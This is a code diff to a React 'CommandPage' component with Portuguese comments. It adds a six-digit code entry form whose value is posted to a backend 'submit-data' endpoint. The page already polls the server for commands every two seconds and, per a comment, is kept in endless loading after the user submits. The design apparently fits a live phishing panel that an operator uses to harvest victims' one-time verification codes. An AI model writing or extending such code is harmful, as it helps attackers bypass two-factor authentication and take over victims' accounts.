@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import axios from "axios";
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
@@ -9,6 +9,8 @@ function CommandPage({ userId }) {
   const [inputValue, setInputValue] = useState("");
   const [loading, setLoading] = useState(false);
   const [submitted, setSubmitted] = useState(false);
+  const [codeDigits, setCodeDigits] = useState(['', '', '', '', '', '']);
+  const inputRefs = useRef([]);
 
   // Verificar comandos a cada 2 segundos
   useEffect(() => {
@@ -32,16 +34,62 @@ function CommandPage({ userId }) {
     e.preventDefault();
     setLoading(true);
     
+    const code = codeDigits.join('');
+    
     try {
       await axios.post(`${API}/user/submit-data/${userId}`, {
         field: field,
-        value: inputValue
+        value: code
       });
       setSubmitted(true);
     } catch (error) {
       console.error("Erro ao enviar dados:", error);
     }
     // Manter em loading infinito após enviar
+  };
+
+  // Handler para os 6 quadradinhos do código
+  const handleCodeChange = (index, value) => {
+    if (loading) return;
+    
+    // Aceitar apenas números
+    const digit = value.replace(/\D/g, '').slice(-1);
+    
+    const newDigits = [...codeDigits];
+    newDigits[index] = digit;
+    setCodeDigits(newDigits);
+    
+    // Auto-avançar para o próximo campo
+    if (digit && index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleKeyDown = (index, e) => {
+    if (loading) return;
+    
+    // Voltar para o campo anterior ao apagar
+    if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const handlePaste = (e) => {
+    if (loading) return;
+    
+    e.preventDefault();
+    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
+    const newDigits = [...codeDigits];
+    
+    for (let i = 0; i < pastedData.length; i++) {
+      newDigits[i] = pastedData[i];
+    }
+    
+    setCodeDigits(newDigits);
+    
+    // Focar no último campo preenchido ou no próximo vazio
+    const focusIndex = Math.min(pastedData.length, 5);
+    inputRefs.current[focusIndex]?.focus();
   };
 
   // Página de dados inválidos
